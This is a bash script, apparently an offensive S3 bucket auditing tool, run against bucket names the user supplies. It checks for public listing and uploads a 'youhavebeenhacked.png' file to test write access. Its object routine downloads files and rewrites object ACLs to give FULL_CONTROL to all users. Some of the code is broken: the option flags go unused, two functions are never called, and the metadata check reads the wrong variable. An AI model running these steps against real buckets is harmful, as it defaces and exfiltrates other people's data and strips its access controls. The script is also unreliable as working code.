#!/bin/bash
shopt -s nocasematch
RED='\e[41;97m'
WHITE='\033[0;37m'
RESET='\033[0m'
YELLOW='\033[0;93m'
TEST='\e[45m'
YEL='\e[38;5;226m'


if [[ $* =~ ^\-o ]] || [[ $* =~ " -o " ]] || [[ $* =~ " -o" ]];
then
  abc=1		
fi

if [[ $* =~ ^\-p ]] || [[ $* =~ " -p " ]] || [[ $* =~ " -p" ]];
then
  abcd=1
fi

if [[ $* =~ ^\-d ]] || [[ $* =~ " -d " ]] || [[ $* =~ " -d" ]];
then
  do=1
fi


if [[ $(ls ~/.aws/config 2>&1) == *"No such file"* ]] && [[ $(ls ~/.aws/credentials 2>&1) == *"No such file"* ]];
then
  echo -e "\nPlease configure your AWS CLI by typing in the following in your terminal: \e[40;38;5;82maws configure${RESET}\n"
  exit 1		
fi

if [ -z "$1" ] || [ $1 == "-h" ] || [ $1 == "--help" ]
then
  echo "Usage:" 
  echo "-u for single bucket"
  echo "-f for file containing the list of all the buckets"
  echo "-o for performing object level analysis"
  echo "-p for changing the bucket ACL if allowed"
  echo "-d for dumping the whole bucket if allowed"
  echo "-h for help"
  echo -e "Eg: \e[44;97m./bucketveritas.sh -u bucketname${RESET}"
  echo -e "    \e[44;97m./bucketveritas.sh -f filepath${RESET}"
  echo -e "\nFor performing object level checks as well:"
  echo -e "    \e[44;97m./bucketveritas.sh -u bucketname -o${RESET}"
  echo -e "\nFor modifying Bucket ACL if possible:"
  echo -e "    \e[44;97m./bucketveritas.sh -u bucketname -o -p${RESET}"
  echo -e "\nPerforms all the checks as well as tries to dump the whole bucket(Recommended way):"
  echo -e "    \e[44;97m./bucketveritas.sh -u bucketname -o -p -d${RESET}" 
  echo -e "\nSame as above but for a list of buckets:"
  echo -e "    \e[44;97m./bucketveritas.sh -f filepath -o -p -d${RESET}" 

  exit 1
fi

Msg()
{
bucket=$1
echo -e "${YEL}=======================================================================================${RESET}\n"
echo -e "$c- \e[1;4m$bucket${RESET}"

echo -e "\n\e[30;48;5;82mTesting for Directory Listing . . .${RESET}\n"
open=$(curl -s "$bucket.s3.amazonaws.com" | xmllint --format -)
if [[ $open == *"<Message>Access Denied</Message>"* ]]; then
  echo -e "\e[41;97mFailed!!!${RESET}\n"
elif [[ $open == *"<Message>The specified bucket does not exist</Message>"* ]]; then
  echo -e "\e[41;97mFailed!!!${RESET}\n"
else
  temp=$(echo -e "$open" | grep -oP '(?<=<Key>).*?(?=</Key>)')
  echo -e "${WHITE}$temp${RESET}"	  
fi

echo -e "\n\e[30;48;5;82mTesting for File Upload . . .${RESET}\n"
up=$(curl -s -X PUT --upload-file youhavebeenhacked.png http://$bucket.s3.amazonaws.com/)
if [[ $up == *"<Message>Access Denied</Message>"* ]]; then
  echo -e "\e[41;97mFailed!!!${RESET}\n"
elif [[ $up == *"<Message>The specified bucket does not exist</Message>"* ]]; then
  echo -e "\e[41;97mFailed!!!${RESET}\n"
else
  echo -e "${WHITE}Uploaded successfully!!${RESET}"	  
fi



}

list()
{
len=$(wc -l $url_list | cut -d " " -f 1)
c=1
while [ $c -le $len ]
do
bucket_f=$(head -$c $url_list | tail -1)
Msg $bucket_f
((c+=1))
done
}

site()
{
Msg $url
}

juicy()
{
j="$(echo "$1" | grep -i -f sensitive.txt)"

if [[ $j =~ ^\ *$ ]];
then
	:
else
	echo -e "\n\e[30;48;5;82mPossible Interesting Files/Folders${RESET}\n"
        echo -e "${YELLOW}$j${RESET}"
fi
}

obje()
{
bucket=$1
echo -e "\n\e[44;97mEnter File/Object Based Analysis(yes/no)${RESET}\n"
read obj
if [[ $obj == "yes" ]] || [[ $obj == "y" ]]; then
  flag=1
  while [ $flag -eq 1 ]
  do
  echo -e "\n\e[44;97mEnter File/object name from the above directory listing:${RESET}\n"
  read obj2
  x1=$(aws s3api get-object-acl --bucket $bucket --key $obj2 2>&1)
  x2=$(aws s3api head-object --bucket $bucket --key $obj2 2>&1)
  echo -e "\n\e[44;97mTrying to Fetch object ACL:${RESET}\n"
  if [[ $x1 == *"An error"* ]]; then
    echo -e "${RED}Failed!!!${RESET}\n"
  else
    echo -e "${WHITE}$x1${RESET}"
  fi
  echo -e "\n\e[44;97mTrying to Fetch object metadata:${RESET}\n"
  if [[ $x1 == *"An error"* ]]; then
    echo -e "${RED}Failed!!!${RESET}\n"
  else
    echo -e "${WHITE}$x2${RESET}"
  fi
  echo -e "\n\e[44;97mWant to dump this file(yes/no)${RESET}\n"
  read obj3
  if [[ $obj3 == "yes" ]] || [[ $obj3 == "y" ]]; then
    dump=$(aws s3 cp s3://$bucket/$obj2 $bucket/$obj2 2>&1)
    if [[ $dump == *"An error"* ]]; then
      echo -e "\n${RED}Failed!!!${RESET}\n"
    else
      echo -e "\n${WHITE}Successfully downloaded to $PWD/$bucket/$obj2${RESET}"
    fi
  fi
  echo -e "\n\e[44;97mTry to change object/file acl(yes/no)${RESET}\n"
  read obj4
  if [[ $obj4 == "yes" ]] || [[ $obj4 == "y" ]]; then
    ac2=$(aws s3api put-object-acl --bucket $bucket --key $obj2 --grant-full-control uri=http://acs.amazonaws.com/groups/global/AllUsers 2>&1)
    if [[ $ac2 == *"An error"* ]]; then
     echo -e "\n${RED}Failed!!!${RESET}\n"
    else
     echo -e "\n${WHITE}ACL changed to FULL CONTROL for everyone${RESET}\n"  
    fi
  fi 	
  echo -e "\n\e[30;48;5;82mDo you want to test this for another file(yes/no):${RESET}\n"
  read ans
  ans=${ans,,}
  if [[ ! $ans =~ ^(y|yes|Y|YES)$ ]]; then
     break   
  fi  
  done
  echo -e "\n"
fi
}

while getopts :f:u:h name; do
    case $name in
        f) url_list=${OPTARG}
	   list
	   echo -e "\n${YEL}=======================================================================================${RESET}\n";;
	u) url=${OPTARG}
	   site
	   echo -e "\n${YEL}=======================================================================================${RESET}\n";;	
    esac
done





